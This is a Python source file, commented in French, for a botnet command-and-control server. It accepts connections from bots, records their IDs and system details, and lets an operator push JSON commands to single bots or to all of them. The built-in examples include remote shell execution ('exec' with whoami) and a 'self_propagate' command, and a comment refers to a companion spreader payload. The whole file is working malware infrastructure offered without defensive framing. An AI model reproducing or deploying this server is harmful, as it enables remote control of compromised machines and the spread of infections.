import socket
import threading
import json
import time
import datetime
import sys

# --- Configuration du Serveur C2 ---
HOST = '0.0.0.0'  # Écoute sur toutes les interfaces disponibles
PORT = 8080       # Port d'écoute pour les bots (doit correspondre à BOT_PAYLOAD_URL dans le spreader)
MAX_CONNECTIONS = 100 # Nombre maximum de bots simultanés

# Dictionnaire pour stocker les informations sur les bots connectés
# Key: bot_id (str), Value: { 'socket': sock_obj, 'last_seen': timestamp, 'status': str, 'info': dict }
connected_bots = {}
connected_bots_lock = threading.Lock() # Verrou pour protéger l'accès à connected_bots

# --- Fonctions d'Utilité ---

def log_message(message):
    """Affiche un message avec un horodatage."""
    timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    print(f"{timestamp} {message}")

def send_command_to_bot(bot_id, command_payload):
    """Envoie une commande JSON à un bot spécifique."""
    with connected_bots_lock:
        if bot_id in connected_bots:
            try:
                bot_socket = connected_bots[bot_id]['socket']
                # Assurez-vous que le message est terminé par un saut de ligne pour faciliter la lecture par le bot
                bot_socket.sendall(json.dumps(command_payload).encode() + b'\n')
                log_message(f"C2 -> Bot {bot_id}: Sent command '{command_payload.get('cmd')}'")
                return True
            except socket.error as e:
                log_message(f"ERROR: Failed to send command to {bot_id}: {e}")
                remove_bot(bot_id)
                return False
        else:
            log_message(f"ERROR: Bot {bot_id} not found or disconnected.")
            return False

def remove_bot(bot_id):
    """Supprime un bot de la liste des bots connectés."""
    with connected_bots_lock:
        if bot_id in connected_bots:
            log_message(f"Bot {bot_id} disconnected.")
            try:
                connected_bots[bot_id]['socket'].close()
            except socket.error:
                pass # Socket déjà fermé ou erreur
            del connected_bots[bot_id]

# --- Thread de Gestion des Bots ---

def handle_bot_connection(bot_socket, addr):
    """Gère la communication avec un bot connecté."""
    bot_id = None
    log_message(f"New connection from {addr}")

    try:
        # Première réception pour obtenir l'ID du bot (généralement envoyé avec le premier heartbeat)
        # On lit en continu car les messages peuvent être fragmentés ou multiples
        buffer = b''
        while True:
            data = bot_socket.recv(4096)
            if not data:
                break # Le bot s'est déconnecté

            buffer += data
            while b'\n' in buffer:
                line, buffer = buffer.split(b'\n', 1)
                try:
                    message = json.loads(line.decode())
                    msg_type = message.get("type")

                    if msg_type == "heartbeat":
                        bot_id = message.get("bot_id")
                        if bot_id not in connected_bots:
                            with connected_bots_lock:
                                connected_bots[bot_id] = {
                                    'socket': bot_socket,
                                    'address': addr,
                                    'last_seen': time.time(),
                                    'status': message.get('status', 'active'),
                                    'info': {
                                        'os': message.get('os', 'unknown'),
                                        'arch': message.get('arch', 'unknown')
                                    }
                                }
                            log_message(f"Bot {bot_id} connected from {addr}. OS: {message.get('os')}, Arch: {message.get('arch')}")
                        else:
                            with connected_bots_lock:
                                connected_bots[bot_id]['last_seen'] = time.time()
                                connected_bots[bot_id]['status'] = message.get('status', 'active')
                                # Mettre à jour d'autres infos si elles changent
                        # log_message(f"Heartbeat from Bot {bot_id}") # Trop verbeux, à décommenter pour debug

                    elif msg_type == "command_result":
                        bot_id_result = message.get("bot_id")
                        command_name = message.get("command")
                        output = message.get("output", "").strip()
                        success = message.get("success", False)
                        log_message(f"--- RESULT from Bot {bot_id_result} (Cmd: '{command_name}', Success: {success}) ---")
                        for line_out in output.split('\n'):
                            log_message(f"    {line_out}")
                        log_message(f"------------------------------------------------------------------")

                    else:
                        log_message(f"UNKNOWN MESSAGE TYPE from {addr}: {message}")

                except json.JSONDecodeError:
                    log_message(f"ERROR: Invalid JSON received from {addr}: {line.decode()}")
                except Exception as e:
                    log_message(f"ERROR processing message from {addr}: {e}")

    except socket.error as e:
        log_message(f"Socket error with {addr}: {e}")
    except Exception as e:
        log_message(f"Unexpected error in bot handler for {addr}: {e}")
    finally:
        if bot_id:
            remove_bot(bot_id)
        else:
            log_message(f"Connection from {addr} closed before bot ID was identified.")
            try:
                bot_socket.close()
            except socket.error:
                pass

# --- Thread de la Console C2 ---

def c2_console_thread():
    """Gère les entrées de la console de l'opérateur."""
    log_message("C2 Console ready. Type 'help' for commands.")
    while True:
        try:
            command_line = input("C2> ").strip()
            if not command_line:
                continue

            parts = command_line.split(' ', 2) # Sépare en max 3 parties: 'cmd', 'bot_id/all', 'args'
            cmd = parts[0].lower()

            if cmd == "list":
                list_bots()
            elif cmd == "send":
                if len(parts) >= 3:
                    target = parts[1] # bot_id ou "all"
                    payload_str = parts[2]
                    try:
                        # Permet d'envoyer n'importe quel JSON valide comme payload
                        command_payload = json.loads(payload_str)
                        if not isinstance(command_payload, dict):
                            raise ValueError("Payload must be a JSON object.")
                        send_command(target, command_payload)
                    except json.JSONDecodeError:
                        log_message("ERROR: Invalid JSON payload. Example: 'send <bot_id|all> {\"cmd\":\"exec\", \"args\":\"ls -la\"}'")
                    except ValueError as ve:
                        log_message(f"ERROR: {ve}")
                else:
                    log_message("Usage: send <bot_id|all> <json_command_payload>")
                    log_message("Example: send all {\"cmd\":\"exec\", \"args\":\"whoami\"}")
                    log_message("Example: send <bot_id> {\"cmd\":\"self_propagate\"}")
            elif cmd == "help":
                display_help()
            elif cmd == "exit" or cmd == "quit":
                log_message("Shutting down C2 server...")
                # Ici, on devrait fermer tous les sockets et arrêter les threads
                # Pour cette simulation, un sys.exit() est suffisant.
                os._exit(0) # Forcer la sortie pour arrêter tous les threads
            else:
                log_message("Unknown command. Type 'help'.")
        except EOFError: # Ctrl+D
            log_message("Exiting console.")
            os._exit(0)
        except Exception as e:
            log_message(f"Console error: {e}")

def list_bots():
    """Affiche la liste des bots connectés."""
    with connected_bots_lock:
        if not connected_bots:
            log_message("No bots currently connected.")
            return

        log_message("--- Connected Bots ---")
        for bot_id, bot_data in connected_bots.items():
            last_seen_str = datetime.datetime.fromtimestamp(bot_data['last_seen']).strftime("%H:%M:%S")
            uptime = int(time.time() - bot_data['last_seen'])
            log_message(f"  ID: {bot_id} | IP: {bot_data['address'][0]} | OS: {bot_data['info']['os']} | Arch: {bot_data['info']['arch']} | Last Seen: {last_seen_str} ({uptime}s ago) | Status: {bot_data['status']}")
        log_message("----------------------")

def send_command(target, command_payload):
    """Envoie une commande à un ou plusieurs bots."""
    if target.lower() == "all":
        with connected_bots_lock:
            if not connected_bots:
                log_message("No bots to send command to.")
                return
            log_message(f"Sending command '{command_payload.get('cmd')}' to ALL {len(connected_bots)} bots...")
            for bot_id in list(connected_bots.keys()): # Itérer sur une copie pour éviter des problèmes si des bots se déconnectent
                send_command_to_bot(bot_id, command_payload)
    else:
        log_message(f"Sending command '{command_payload.get('cmd')}' to Bot {target}...")
        send_command_to_bot(target, command_payload)

def display_help():
    """Affiche les commandes disponibles."""
    log_message("--- C2 Commands ---")
    log_message("list                           : List all connected bots.")
    log_message("send <bot_id|all> <json_payload> : Send a command to a specific bot or all bots.")
    log_message("                                   Example: send all {\"cmd\":\"exec\", \"args\":\"ls -la\"}")
    log_message("                                   Example: send <bot_id> {\"cmd\":\"self_propagate\"}")
    log_message("help                           : Display this help message.")
    log_message("exit | quit                    : Shut down the C2 server.")
    log_message("-------------------")

# --- Fonction Principale ---

def main_c2_server():
    """Initialise et démarre le serveur C2."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Permet de réutiliser l'adresse rapidement

    try:
        server_socket.bind((HOST, PORT))
        server_socket.listen(MAX_CONNECTIONS)
        log_message(f"C2 Server listening on {HOST}:{PORT}")
    except socket.error as e:
        log_message(f"ERROR: Could not start server on {HOST}:{PORT}: {e}")
        sys.exit(1)

    # Démarrer le thread de la console
    console_thread = threading.Thread(target=c2_console_thread, daemon=True)
    console_thread.start()

    while True:
        try:
            bot_socket, addr = server_socket.accept()
            # Démarrer un nouveau thread pour gérer chaque bot
            bot_handler = threading.Thread(target=handle_bot_connection, args=(bot_socket, addr), daemon=True)
            bot_handler.start()
        except KeyboardInterrupt:
            log_message("C2 Server interrupted. Shutting down...")
            break
        except Exception as e:
            log_message(f"Error accepting connection: {e}")

    server_socket.close()
    log_message("C2 Server shut down.")

if __name__ == "__main__":
    main_c2_server()
